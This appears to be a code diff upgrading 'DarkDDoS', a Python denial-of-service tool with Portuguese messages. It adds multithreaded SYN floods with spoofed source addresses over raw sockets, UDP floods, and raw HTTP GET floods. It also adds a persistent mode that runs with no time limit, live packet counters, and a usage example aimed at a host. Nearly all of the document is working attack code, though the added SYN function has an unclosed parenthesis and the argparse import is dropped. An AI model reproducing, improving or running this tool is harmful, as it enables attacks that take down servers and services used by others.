@@ -3,65 +3,132 @@ import time
 import socket
 import threading
 import random
+import requests
 from scapy.all import *
+from scapy.layers.inet import IP, TCP, UDP
+
+# Configuração
+BUFFER_SIZE = 4096
+MAX_RETRIES = 5  
+SOCKET_TIMEOUT = 3  
 
 class DarkDDoS:
     def __init__(self):
-        self.target_ip = None
-        self.target_port = None
-        self.attack_method = None
-        self.proxies = []
-    
+        self.running = True
+        self.stats = {"packets_sent": 0, "errors": 0}
+        self.lock = threading.Lock()
+
+    def _generate_fake_ip(self):
+        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
+
     def _syn_flood(self):
-        while True:
-            src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
-            sport = random.randint(1024, 65535)
-            packet = IP(src=src_ip, dst=self.target_ip)/TCP(sport=sport, dport=self.target_port, flags="S")
-            send(packet, verbose=0)
-    
-    def _udp_flood(self):
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        while True:
-            data = random._urandom(1490)
-            sock.sendto(data, (self.target_ip, self.target_port))
-    
-    def _http_flood(self):
-        while True:
+        while self.running:
             try:
-                requests.get(f"http://{self.target_ip}", proxies={"http": random.choice(self.proxies)} if self.proxies else None)
-            except:
-                pass
-    
-    def start(self, target_ip, target_port, method="syn", threads=100, duration=60):
+                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+                
+                packet = IP(src=self._generate_fake_ip(), dst=self.target_ip)/TCP(
+                    sport=random.randint(1024, 65535),
+                    dport=self.target_port,
+                    flags="S",
+                    window=64240,
+                    seq=random.getrandbits(32)
+                
+                s.sendto(bytes(packet), (self.target_ip, 0))
+                with self.lock:
+                    self.stats["packets_sent"] += 1
+            except Exception as e:
+                with self.lock:
+                    self.stats["errors"] += 1
+                time.sleep(SOCKET_TIMEOUT)
+            finally:
+                s.close() if 's' in locals() else None
+
+    def _udp_flood(self):
+        payload = random._urandom(BUFFER_SIZE)
+        while self.running:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                s.sendto(payload, (self.target_ip, self.target_port))
+                with self.lock:
+                    self.stats["packets_sent"] += 1
+            except Exception as e:
+                with self.lock:
+                    self.stats["errors"] += 1
+                time.sleep(SOCKET_TIMEOUT)
+            finally:
+                s.close() if 's' in locals() else None
+
+    def _http_flood(self):
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Connection': 'keep-alive'
+        }
+        while self.running:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(SOCKET_TIMEOUT)
+                s.connect((self.target_ip, self.target_port))
+                s.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
+                s.send(f"Host: {self.target_ip}\r\n".encode())
+                for header, value in headers.items():
+                    s.send(f"{header}: {value}\r\n".encode())
+                s.send("\r\n".encode())
+                with self.lock:
+                    self.stats["packets_sent"] += 1
+            except Exception as e:
+                with self.lock:
+                    self.stats["errors"] += 1
+            finally:
+                s.close() if 's' in locals() else None
+
+    def _monitor(self):
+        while self.running:
+            time.sleep(5)
+            with self.lock:
+                print(f"\n[+] Estatísticas - Pacotes: {self.stats['packets_sent']} | Erros: {self.stats['errors']}")
+
+    def start(self, target_ip, target_port, method="syn", threads=500, duration=0):
         self.target_ip = target_ip
         self.target_port = target_port
-        self.attack_method = method
         
         print(f"[+] Iniciando ataque {method.upper()} em {target_ip}:{target_port}")
-        threads_list = []
+        print(f"[+] Threads: {threads} | Modo: Persistente" if duration == 0 else f" | Duração: {duration}s")
+
+        
+        threading.Thread(target=self._monitor, daemon=True).start()
+
         
         for _ in range(threads):
-            if method == "syn":
-                t = threading.Thread(target=self._syn_flood)
-            elif method == "udp":
-                t = threading.Thread(target=self._udp_flood)
-            elif method == "http":
-                t = threading.Thread(target=self._http_flood)
-            threads_list.append(t)
+            t = threading.Thread(target=getattr(self, f"_{method}_flood"))
+            t.daemon = True
             t.start()
+
+        try:
+            if duration > 0:
+                time.sleep(duration)
+                self.running = False
+                print("\n[!] Ataque programado concluído")
+            else:
+                while True:
+                    time.sleep(1)
+        except KeyboardInterrupt:
+            self.running = False
+            print("\n[!] Ataque interrompido pelo usuário")
         
-        time.sleep(duration)
-        print("[!] Ataque concluído. Encerrando...")
         sys.exit(0)
 
 if __name__ == "__main__":
-    import argparse
-    parser = argparse.ArgumentParser(description="DarkDDoS - Ferramenta de Stress Testing")
-    parser.add_argument("-t", "--target", required=True, help="IP do alvo")
-    parser.add_argument("-p", "--port", type=int, required=True, help="Porta do alvo")
-    parser.add_argument("-m", "--method", choices=["syn", "udp", "http"], default="syn", help="Método de ataque")
-    parser.add_argument("-th", "--threads", type=int, default=100, help="Número de threads")
-    parser.add_argument("-d", "--duration", type=int, default=60, help="Duração em segundos")
+    # Exemplo de uso:
+    # python3 DarkDDoS.py -t 192.168.1.100 -p 80 -m http -th 1000 -d 0
+    parser = argparse.ArgumentParser(description="DarkDDoS v2.0 - Ferramenta Avançada")
+    parser.add_argument("-t", "--target", required=True)
+    parser.add_argument("-p", "--port", type=int, required=True)
+    parser.add_argument("-m", "--method", choices=["syn", "udp", "http"], default="syn")
+    parser.add_argument("-th", "--threads", type=int, default=500)
+    parser.add_argument("-d", "--duration", type=int, default=0)
     args = parser.parse_args()
-    
+
     DarkDDoS().start(args.target, args.port, args.method, args.threads, args.duration)
